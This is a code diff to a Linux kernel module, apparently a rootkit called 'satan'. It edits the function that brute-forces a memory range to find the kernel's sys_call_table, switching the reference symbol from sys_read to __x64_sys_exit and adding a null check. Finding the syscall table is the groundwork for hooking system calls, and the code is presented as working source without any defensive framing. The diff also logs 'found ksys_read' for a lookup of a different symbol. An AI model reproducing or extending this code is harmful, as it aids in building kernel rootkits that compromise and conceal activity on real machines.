@@ -7,7 +7,7 @@
 #include "util.h"
 
 
-#define BRUTEFORCE_ADDR_BEGIN 0xc0000000
+#define BRUTEFORCE_ADDR_BEGIN 0xd0000000
 #define BRUTEFORCE_ADDR_END 0xe0000000
 #define SYS_CALL_ID_SIZE 512
 
@@ -45,13 +45,17 @@ static int satan_syscall_find_table(void)
         unsigned long *real_sys_read = NULL;
         unsigned long ptr = 0;
 
-        real_sys_read = (void *) kallsyms_lookup_name("sys_read");
-        pr_info("satan: syscall: found sys_read via kallsyms: %p\n", real_sys_read);
+        real_sys_read = (void *) kallsyms_lookup_name("__x64_sys_exit");
+        pr_info("satan: syscall: found ksys_read via kallsyms: %p\n", real_sys_read);
+
+        if (!real_sys_read) {
+          return 1;
+        }
 
         for (ptr = BRUTEFORCE_ADDR_BEGIN; ptr <= BRUTEFORCE_ADDR_END; ptr++) {
                 table = (unsigned long **) ptr;
 
-                if (table[__NR_read] == (unsigned long *) real_sys_read) {
+                if (table[__NR_exit] == (unsigned long *) real_sys_read) {
                         pr_info("satan: found sys_call_table: %p\n", table);
                         has_found_table = true;
                         return 0;
